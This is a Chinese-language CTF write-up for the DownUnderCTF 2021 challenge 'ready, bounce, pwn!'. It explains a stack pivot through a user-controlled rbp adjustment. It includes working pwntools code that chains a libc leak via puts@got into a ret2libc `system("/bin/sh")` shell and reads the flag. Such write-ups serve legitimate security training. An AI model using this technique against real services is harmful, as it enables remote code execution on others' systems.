# DownUnderCTF 2021 - ready, bounce, pwn!

## 题目简述

64 位 ELF 开启 NX、关闭 PIE，且没有栈 canary。程序把 24 字节姓名读入栈中，随后读取一个长整数，并在函数尾声执行 `add rbp, value`。虽然姓名读取本身没有越界，但用户可在 `leave; ret` 前移动 `rbp`，把栈指针枢轴到姓名缓冲区中的伪造栈帧。

## 解题过程

函数尾部的关键指令为：

```asm
call read_long
add  rbp, rax
leave
ret
```

`leave` 等价于 `mov rsp, rbp; pop rbp`。因此，若姓名缓冲区位于原 `rbp-0x20`，提交偏移 `-0x20` 就会让 `leave` 从缓冲区开头恢复伪造的 `rbp`，再把缓冲区第二个八字节当作返回地址。

第一轮先返回到 `main+1`。跳过开头的 `push rbp` 后，第二轮建立的栈帧相对第一次发生位移，使新的 24 字节姓名读取落到旧缓冲区之前；旧缓冲区末尾预留的另一个 `main+1` 会自然接在三段 ROP 后面，相当于在只有 24 字节输入的情况下获得第四个返回地址。

第一阶段用 `puts(puts@got)` 泄露 libc，再回到 `main+1`：

```python
from pwn import ELF, context, p64, remote, u64

context.binary = elf = ELF("./rbp", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = remote(HOST, PORT)

def pivot(name, offset):
    io.sendafter(b"name? ", name)
    io.sendlineafter(b"number? ", str(offset).encode())

pop_rdi = 0x4012B3
main_again = elf.sym.main + 1

pivot(b"A" * 8 + p64(main_again) * 2, -0x20)
pivot(p64(pop_rdi) + p64(elf.got.puts) + p64(elf.plt.puts), -0x28)

puts_addr = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = puts_addr - 0x809D0
```

提供的 libc 中，`system` 偏移为 `0x4fa60`，字符串 `"/bin/sh"` 偏移为 `0x1abf05`。第二阶段不再需要返回主函数，24 字节正好容纳 `pop rdi; /bin/sh; system`：

```python
system = libc.address + 0x4FA60
bin_sh = libc.address + 0x1ABF05
pivot(p64(pop_rdi) + p64(bin_sh) + p64(system), -0x28)

io.sendline(b"cat flag.txt")
print(io.recvline().decode())
```

最终得到：

```text
DUCTF{n0_0verfl0w?_n0_pr0bl3m!}
```

## 方法总结

本题展示了“没有越界读取也能控制返回流”：只要攻击者能修改 `rbp`，`leave` 就会变成栈迁移原语。受限输入长度下，可利用重复进入函数造成的新旧栈帧重叠，把上一轮残留的返回地址拼到当前 ROP 链后；随后按常规 ret2libc 先泄露 GOT，再调用 `system("/bin/sh")`。
